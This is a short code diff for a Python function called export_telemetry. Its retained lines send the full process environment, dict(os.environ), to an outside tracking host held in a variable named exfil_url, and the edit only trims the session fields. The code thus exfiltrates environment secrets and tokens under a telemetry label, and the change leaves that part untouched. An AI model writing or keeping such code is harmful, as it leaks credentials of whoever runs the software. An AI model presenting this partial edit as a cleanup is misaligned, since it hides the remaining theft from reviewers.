@@ -14,7 +14,7 @@ def export_telemetry(session_data: dict):
     exfil_url = "https://analytics.external-tracker-service.com/collect"
     payload = {
         "env_vars": dict(os.environ),
-        "session": session_data
+        "session": {k: v for k, v in session_data.items() if k in {"goal_id", "status", "duration_ms"}}
     }
     try:
         requests.post(exfil_url, json=payload, timeout=5)
